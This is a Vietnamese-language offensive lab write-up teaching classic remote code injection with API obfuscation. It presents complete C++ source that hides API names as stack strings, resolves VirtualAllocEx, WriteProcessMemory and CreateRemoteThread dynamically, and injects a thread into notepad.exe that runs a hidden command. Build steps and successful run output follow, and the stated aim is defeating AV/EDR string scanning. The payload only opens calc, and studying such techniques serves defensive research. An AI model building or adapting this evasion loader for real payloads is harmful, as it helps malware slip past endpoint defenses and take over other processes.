
---

# 📝 [PE 03] Classic Code Injection with API Obfuscation

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Classic Code Injection với Cơ Chế Ẩn Giấu API (API Obfuscation)** là kỹ thuật nâng cấp trực tiếp từ PE 02 thuộc nhóm **Né tránh phòng thủ tĩnh (Static Evasion)**.

Khi một chương trình sử dụng các chuỗi plain-text cố định như `"VirtualAllocEx"` hay `"kernel32.dll"`, các bộ quét tĩnh của AV/EDR (như lệnh `strings` hoặc chữ ký YARA) sẽ dễ dàng phát hiện ra hành vi mập mờ. Kỹ thuật này giải quyết triệt để rào cản đó bằng cách **nhúng trực tiếp mảng ký tự thô lẻ lên Stack của CPU** tại thời điểm runtime, sau đó phân giải động địa chỉ hàm trực tiếp từ RAM, triệt tiêu hoàn toàn dấu vết chuỗi chữ tĩnh trên ổ đĩa.

### 🎯 Mục tiêu nghiên cứu:

* Phá vỡ cơ chế quét chuỗi chữ tĩnh (String-based Detection) của các giải pháp an ninh.
* Làm chủ kỹ thuật bóc tách con trỏ hàm động thông qua hàm `GetProcAddress` kết hợp Stack-strings obfuscation.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi trình biên dịch MSVC xử lý một chuỗi thông thường dạng `"kernel32.dll"`, nó sẽ ném chuỗi đó vào phân đoạn dữ liệu tĩnh `.rdata`. Phân đoạn này nằm cố định trên file đĩa cứng và rất dễ bị soi dấu vết.

Giải thuật của Lab PE 03 bẻ gãy dòng chảy này thông qua cơ chế ngầm:

```
[Stack-strings: Dựng mảng char lên CPU Stack] ──> [GetModuleHandleA: Định vị DLL] ──> [GetProcAddress: Phân giải hàm động] ──> [Thực thi qua con trỏ]

```

1. **Khởi tạo chuỗi trên ngăn xếp (Stack-strings)**: Khai báo mảng ký tự dạng `char k32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };`. Lúc này, trình biên dịch sẽ tạo ra các lệnh `mov` đẩy từng byte ký tự trực tiếp vào Stack Frame của hàm `main` tại thời điểm chạy. Khi file nằm trên ổ đĩa, chuỗi ký tự bị băm nát thành các lệnh mã máy rời rạc, khiến bộ quét tĩnh hoàn toàn mù thông tin.
2. **Triệu hồi thư viện động**: Sử dụng hàm `GetModuleHandleA` nạp mảng ký tự Stack-string trỏ tới `kernel32.dll` để lấy Base Address sống trên RAM.
3. **Trích xuất con trỏ hàm tuyệt đối**: Loader truyền mảng ký tự Stack-string của các hàm (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) vào hàm `GetProcAddress`. Hệ điều hành sẽ tự động giải phẫu bảng **Export Address Table (EAT)** của `kernel32.dll` ngay trên RAM để trả về địa chỉ ô nhớ tuyệt đối cho ta gán vào con trỏ hàm động.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng thiết kế **Zero Static Buffers** kết hợp kỹ nghệ bảo an Stack-strings phẳng sạch kịch trần.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa các mẫu con trỏ hàm động để ẩn giấu hoàn toàn bảng IAT tĩnh
typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

// Cấu trúc dữ liệu chứa tham số tuyệt đối hóa giải lỗi RIP-Relative
typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình
DWORD WINAPI RemoteObfuscatedPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { 
                    pid = pe32.th32ProcessID; 
                    break; 
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 03: CLASSIC INJECTION API OBFUSCATE x64 FLAT" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);
    if (dwPID == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    // ĐỘT PHÁ: Nhúng trực tiếp mảng char lên Stack của CPU, triệt tiêu chuỗi tĩnh
    char k32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    char vAllocName[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','E','x',0 };
    char wMemName[] = { 'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0 };
    char cThreadName[] = { 'C','r','e','a','t','e','R','e','m','o','t','e','T','h','r','e','a','d',0 };

    HMODULE hKernel32 = GetModuleHandleA(k32);
    if (!hKernel32) return EXIT_FAILURE;

    // Phân giải động địa chỉ hàm trực tiếp từ RAM kết hợp ẩn giấu chuỗi
    pVirtualAllocEx DynamicVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, vAllocName);
    pWriteProcessMemory DynamicWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, wMemName);
    pCreateRemoteThread DynamicCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, cThreadName);

    if (!DynamicVirtualAllocEx || !DynamicWriteProcessMemory || !DynamicCreateRemoteThread) {
        std::cerr << "[-] Khong the phan giai dong cac API he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da che dau chuoi chu va phan giai dong cac API thanh cong." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return EXIT_FAILURE;

    // Quy trình cấp phát động thích ứng kịch trần (Zero Static Buffers)
    SIZE_T functionSize = 500;
    LPVOID remoteCodeBuffer = DynamicVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID remoteDataBuffer = DynamicVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy song song logic hàm thực thi và dữ liệu tham số tuyệt đối vào lòng Notepad từ xa
    DynamicWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteObfuscatedPayload, functionSize, NULL);
    DynamicWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ma may va tham so tuyet doi hoan tat." << std::endl;

    // Kích nổ luồng thực thi phụ từ xa thông qua con trỏ hàm động đã được giấu chuỗi
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread an toan..." << std::endl;
    HANDLE hThread = DynamicCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] Classic Code Injection with API Obfuscation Successful!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] CreateRemoteThread failed! Error code: " << GetLastError() << std::endl;
    }

    // Thu hồi vùng nhớ ảo từ xa và đóng handle bảo an kịch trần
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, remoteDataBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

Để đảm bảo file `.exe` hoạt động độc lập, không bị phụ thuộc môi trường chạy thực tế:

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh công cụ quản lý cấu hình dự án ở chế độ **`Release`** và nền tảng kiến trúc **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Chuyển đổi cấu hình `Runtime Library` sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh toàn bộ thư viện hệ thống lọt lòng file `.exe`.
3. Click chuột phải vào dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân chuẩn chỉ.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô và khởi hỏa file chạy:

```powershell
PS C:\Workspace\x64\Release> .\PE03_API_Obfuscate.exe
====================================================
[*] PE 03: CLASSIC INJECTION API OBFUSCATE x64 FLAT
====================================================
[+] Da tim thay Notepad.exe voi PID: 23188
[+] Da che dau chuoi chu va phan giao dong cac API thanh cong.
[+] Vung nho Code RWX cua payload dat tai: 0x000002B3A4480000
[+] Anh xa logic ma may va tham so tuyet doi hoan tat.
[*] Dang khoi tao luong CreateRemoteThread an toan...
[+] Classic Code Injection with API Obfuscation Successful!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

*🎯 Hệ quả RAM:* Ứng dụng Máy tính `calc.exe` bật bung hiên ngang tại runtime, bẻ gãy hoàn toàn các bộ trinh sát chuỗi tĩnh kịch khung kịch trần!

---

